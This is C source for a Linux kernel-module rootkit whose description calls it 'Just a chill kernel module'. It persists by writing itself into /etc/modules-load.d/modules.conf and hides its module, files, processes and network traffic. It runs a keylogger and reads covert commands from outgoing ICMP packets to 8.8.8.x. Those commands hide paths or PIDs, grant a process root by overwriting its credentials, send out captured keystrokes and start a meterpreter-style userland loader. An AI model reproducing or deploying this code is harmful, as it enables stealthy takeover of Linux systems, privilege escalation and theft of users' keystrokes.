#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/string.h>

#include <linux/fs.h>
#include <linux/kmod.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/workqueue.h>

#include <linux/delay.h>
#include <linux/tcp.h>

#include "c2.h"
#include "init.h"
#include "keylogger.h"
#include "socket.h"

#include "hidefs.h"
#include "hidelkm.h"
#include "hidenetwork.h"
#include "hideproc.h"
#include "userloader.h"

static struct nf_hook_ops netfilter_ops_out;

static int rk_persist(void)
{
	struct file *file;
	char *data = kasprintf(GFP_KERNEL, "%s\n", THIS_MODULE->name);
	char *path = "/etc/modules-load.d/modules.conf";
	loff_t pos = 0; // File offset
	ssize_t written;

	// Check file exist
	file = filp_open(path, O_RDONLY, 0);
	if (!IS_ERR(file)) {
		dbg_print("modules.conf already exists");
		filp_close(file, NULL);
		kfree(data);
		return -1;
	}

	// Create or Open the file
	dbg_print("Open file");
	file = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(file)) {
		dbg_print("Failed to open file");
		kfree(data);
		return -1;
	}

	// Write data
	dbg_print("Write file");
	written = kernel_write(file, data, strlen(data), &pos);
	if (written < 0) {
		dbg_print("Failed to write file");
		filp_close(file, NULL);
		kfree(data);
		return -1;
	}

	filp_close(file, NULL);
	kfree(data);
	return 0;
}

static int rk_be_root(pid_t pid)
{
	struct task_struct *task;
	struct cred *new_cred;

	// Find the task by PID
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		return -ESRCH;
	}

	new_cred = (struct cred *)get_task_cred(task);
	if (!new_cred) {
		return -ENOMEM;
	}

	new_cred->uid.val = 0;
	new_cred->gid.val = 0;
	new_cred->euid.val = 0;
	new_cred->egid.val = 0;

	// Apply the new credentials
	commit_creds(new_cred);

	return 0;
}

static unsigned int main_hook_out(void *priv, struct sk_buff *skb,
				  const struct nf_hook_state *state)
{
	struct iphdr *ip_header;
	struct icmphdr *icmp_header;
	unsigned char *icmp_data;
	int icmp_data_len;

	if (!skb)
		return NF_ACCEPT;

	ip_header = ip_hdr(skb);
	if (!ip_header || ip_header->protocol != IPPROTO_ICMP)
		return NF_ACCEPT;

	icmp_header = icmp_hdr(skb);
	if (!icmp_header)
		return NF_ACCEPT;

	icmp_data = (unsigned char *)(icmp_header + 1);
	icmp_data_len = ntohs(ip_header->tot_len) - (ip_header->ihl * 4) -
			sizeof(struct icmphdr);

	if (icmp_data_len > 0 &&
	    ((ip_header->daddr) & 0xffffff00) == 0x08080800) {
		icmp_data += 16;
		// dbg_print("1/ [%x]\n", icmp_data[0]);
		switch (icmp_data[0]) {
		case CODE_HIDE_PID:
			if (icmp_data_len >= 5) {
				uint32_t target_pid =
					*(uint32_t *)(icmp_data + 1);
				// dbg_print("%x\n", target_pid);
				hideproc_add_pid(target_pid);
				// Handle hide this pid
				goto stolen_label;
			}
			break;

		case CODE_HIDE_PATH:
			if (icmp_data_len >= 2 + sizeof(uint32_t)) {
				uint8_t pathlen =
					(uint8_t)(ip_header->daddr & 0xff);
				if (icmp_data_len >= pathlen + 1 + 1) {
					if (*(uint8_t *)(icmp_data + 1)) {
						hidefs_add_file(icmp_data + 1 +
									1,
								pathlen);
					} else {
						hidefs_remove_file(icmp_data +
								   1 + 1);
					}
					// Handle path hide
					goto stolen_label;
				}
			}
			break;

		case CODE_ELEV_PID:
			if (icmp_data_len >= 5) {
				uint32_t target_elev_pid =
					*(uint32_t *)(icmp_data + 1);
				rk_be_root(target_elev_pid);
				goto stolen_label;
			}
			break;

		case CODE_HIDE_OPEN:
			if (icmp_data_len >= 2 + sizeof(uint32_t)) {
				uint8_t open_pathlen =
					(uint8_t)(ip_header->daddr & 0xff);
				if (icmp_data_len >= open_pathlen + 1 + 1) {
					if (*(uint8_t *)(icmp_data + 1)) {
						hidefs_add_file_open(
							icmp_data + 1 + 1,
							open_pathlen);
					} else {
						hidefs_remove_file_open(
							icmp_data + 1 + 1);
					}
					// Handle path hide
					goto stolen_label;
				}
			}
			break;

		case CODE_SEND_KEYLOGGER:
			keylogger_buffer_send();
			break;

		case CODE_GET_METERPRETER:
			userloader_exec();
			hidefs_add_file_open(FILE_PATH, sizeof(FILE_PATH));
			break;

		default:
			break;
		}
	}
	return NF_ACCEPT;
stolen_label:
	return NF_STOLEN;
}

static int __init rk_init(void)
{
	int ret;

	hidelkm_init();

	keylogger_init();

	ret = hidefs_init();
	ret = hidenetwork_init();
	ret = hideproc_init();

	rk_persist();

	netfilter_ops_out.hook = main_hook_out;
	netfilter_ops_out.pf = PF_INET;
	netfilter_ops_out.hooknum = NF_INET_POST_ROUTING;
	netfilter_ops_out.priority = NF_IP_PRI_FIRST;

	nf_register_net_hook(&init_net, &netfilter_ops_out);

	userloader_init();
	hidefs_add_file(FILE_NAME, sizeof(FILE_NAME));
	userloader_exec();
	hidefs_add_file_open(FILE_PATH, sizeof(FILE_PATH));
	return 0;
}

static void __exit rk_exit(void)
{
	keylogger_exit();
	hidefs_exit();
	hidenetwork_exit();
	hideproc_exit();

	nf_unregister_net_hook(&init_net, &netfilter_ops_out);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_AUTHOR("p2lu - exhyl - MikeHorn-git");
MODULE_DESCRIPTION("Just a chill kernel module");
MODULE_LICENSE("GPL");
